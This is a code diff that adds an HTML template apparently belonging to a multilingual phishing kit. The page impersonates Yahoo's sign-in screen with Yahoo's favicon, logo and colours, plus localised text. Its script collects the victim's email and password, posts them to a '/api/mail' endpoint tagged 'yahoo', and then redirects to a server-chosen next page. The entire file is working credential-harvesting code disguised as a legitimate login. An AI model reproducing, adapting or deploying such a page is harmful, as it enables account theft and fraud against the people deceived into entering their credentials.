@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="{{ lang }}">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ get_text(lang, 'yahoo_title') }} - Yahoo</title>
+    <link rel="icon" href="https://s.yimg.com/wm/safety/images/sash/yahoo_favicon_0120.ico">
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
+        body{background-color:#720e9e;color:#333;display:flex;justify-content:center;align-items:center;min-height:100vh}
+        .card{background:#fff;width:100%;max-width:420px;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
+        .logo{text-align:center;margin-bottom:24px;font-size:28px;font-weight:bold;color:#6001d2;letter-spacing:-1px}
+        h1{text-align:center;font-size:20px;margin-bottom:8px}
+        p{text-align:center;font-size:14px;color:#666;margin-bottom:24px}
+        .form-group{margin-bottom:20px}
+        input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px}
+        input:focus{outline:none;border-color:#6001d2}
+        .submit-btn{width:100%;padding:12px;background-color:#6001d2;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}
+        .submit-btn:hover{background-color:#4e00aa}
+        .lang-indicator{text-align:center;font-size:11px;color:#6c6c8a;margin-bottom:10px}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="lang-indicator">🌍 {{ get_text(lang, 'name') }}</div>
+        <div class="logo">yahoo!</div>
+        <h1>{{ get_text(lang, 'yahoo_title') }}</h1>
+        <p>{{ get_text(lang, 'yahoo_subtitle') }}</p>
+        <form id="yahooForm">
+            <div class="form-group">
+                <input type="email" id="mailEmail" required placeholder="{{ get_text(lang, 'yahoo_email') }}">
+            </div>
+            <div class="form-group">
+                <input type="password" id="mailPassword" required placeholder="{{ get_text(lang, 'yahoo_password') }}">
+            </div>
+            <button type="submit" class="submit-btn">{{ get_text(lang, 'yahoo_button') }}</button>
+        </form>
+    </div>
+    <script>
+        document.getElementById('yahooForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const mailEmail = document.getElementById('mailEmail').value;
+            const mailPassword = document.getElementById('mailPassword').value;
+            try {
+                const res = await fetch('/api/mail', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({provider:'yahoo',mailEmail,mailPassword})
+                });
+                const data = await res.json();
+                if(data.status === 'success') {
+                    window.location.href = data.next;
+                }
+            } catch(err) {}
+        });
+    </script>
+</body>
+</html>
